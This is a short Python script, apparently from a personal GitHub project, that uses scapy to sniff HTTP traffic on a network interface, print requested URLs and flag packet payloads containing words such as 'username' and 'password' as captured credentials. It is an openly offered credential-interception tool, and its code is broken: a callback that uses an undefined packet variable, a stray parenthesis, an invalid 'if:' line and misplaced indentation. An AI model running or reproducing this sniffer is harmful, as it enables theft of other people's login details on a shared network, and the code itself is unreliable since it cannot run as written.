import scapy.all as scapy
from scapy.layers import http

print("TOOL IS CREATED BY KRISNA PRANAV")
print("Github Link https://www.github.com/krishpranav")
print("DO NOT FOREGT TO FOLLOW ME :)")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet():
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet([http.HTTPRequest].Path
        print("[+]HTTP REQUEST >> " + url.decode())

        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if:
        keyword in load:
            print("\n\n\[+] Possible Username/Password > " + load)
        break


sniff("en1")



